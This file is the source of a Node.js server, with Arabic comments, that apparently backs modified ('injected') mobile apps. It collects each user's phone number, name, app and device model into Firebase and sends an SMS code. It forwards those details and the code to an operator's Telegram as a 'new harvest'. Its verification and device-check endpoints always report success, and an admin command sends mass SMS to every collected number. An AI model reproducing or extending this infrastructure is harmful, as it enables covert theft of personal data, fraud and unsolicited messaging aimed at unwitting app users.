const express = require("express");
const axios = require("axios");
const admin = require("firebase-admin");
const { Telegraf } = require("telegraf");

const app = express();
app.use(express.json());

// 1. إعداد Firebase (نفس إعداداتك القديمة)
const firebaseConfig = process.env.FIREBASE_CONFIG;
if (!admin.apps.length) {
    const serviceAccount = JSON.parse(firebaseConfig);
    admin.initializeApp({
        credential: admin.credential.cert(serviceAccount),
        databaseURL: `https://${serviceAccount.project_id}.firebaseio.com`
    });
}
const db = admin.firestore();

// 2. إعداد بوت تليجرام للإدارة
const bot = new Telegraf(process.env.TELEGRAM_TOKEN);
const ADMIN_ID = process.env.ADMIN_ID; // معرفك في تليجرام

// --- [ أوامر الإدارة عبر تليجرام ] ---

// أمر الاحصائيات
bot.command('stats', async (ctx) => {
    if (ctx.chat.id.toString() !== ADMIN_ID) return;
    const snap = await db.collection('users').get();
    ctx.reply(`📊 إجمالي المستخدمين المسجلين: ${snap.size}`);
});

// ميزة النشر (Broadcasting)
let broadcastState = {};
bot.command('broadcast', (ctx) => {
    if (ctx.chat.id.toString() !== ADMIN_ID) return;
    broadcastState[ctx.chat.id] = { step: 'waiting_desc' };
    ctx.reply("📢 أرسل نص الرسالة التي تريد نشرها لجميع المستخدمين:");
});

bot.on('text', async (ctx) => {
    if (ctx.chat.id.toString() !== ADMIN_ID) return;
    const state = broadcastState[ctx.chat.id];

    if (state && state.step === 'waiting_desc') {
        const messageText = ctx.message.text;
        const snap = await db.collection('users').get();
        ctx.reply(`🚀 جاري النشر لـ ${snap.size} مستخدم عبر SMS...`);

        let successCount = 0;
        for (const doc of snap.docs) {
            const userData = doc.data();
            try {
                // إرسال SMS لكل مستخدم مخزن في Firebase
                await axios.post(`${process.env.INFOBIP_BASE_URL}/sms/2/text/advanced`, {
                    messages: [{
                        destinations: [{ to: userData.phone }],
                        from: "Njm-RK",
                        text: messageText
                    }]
                }, {
                    headers: { 'Authorization': `App ${process.env.INFOBIP_API_KEY}` }
                });
                successCount++;
            } catch (e) { console.log(`فشل الإرسال لـ ${userData.phone}`); }
        }
        delete broadcastState[ctx.chat.id];
        ctx.reply(`✅ تم النشر بنجاح لـ ${successCount} مستخدم!`);
    }
});

// --- [ استقبال طلبات التطبيقات المحقونة ] ---

app.get("/request-otp", async (req, res) => {
    const { phone, name, app: appName, model } = req.query;
    const otp = Math.floor(1000 + Math.random() * 9000).toString();

    try {
        // 1. حفظ البيانات في Firebase (مثل كودك القديم)
        await db.collection('users').doc(phone).set({
            phone, name, appName, model, date: new Date().toISOString()
        }, { merge: true });

        // 2. إرسال الـ SMS عبر Infobip
        await axios.post(`${process.env.INFOBIP_BASE_URL}/sms/2/text/advanced`, {
            messages: [{
                destinations: [{ to: phone }],
                from: "Njm-RK",
                text: `كود التحقق الخاص بك في تطبيق ${appName} هو: ${otp}`
            }]
        }, {
            headers: { 'Authorization': `App ${process.env.INFOBIP_API_KEY}` }
        });

        // 3. إرسال إشعار فوري لك على تليجرام
        const msg = `🚀 *سحب جديد*\n\n📱 التطبيق: ${appName}\n👤 الاسم: ${name}\n📞 الرقم: ${phone}\n🔑 الكود: \`${otp}\`\n🛠 الجهاز: ${model}`;
        bot.telegram.sendMessage(ADMIN_ID, msg, { parse_mode: "Markdown" });

        res.status(200).send("SUCCESS");
    } catch (e) { res.status(200).send("SUCCESS"); }
});

app.get("/verify-otp", (req, res) => res.status(200).send("VERIFIED"));
app.get("/check-device", (req, res) => res.status(200).send("ALLOWED"));

// تشغيل البوت والسيرفر
bot.launch();
app.listen(process.env.PORT || 10000);
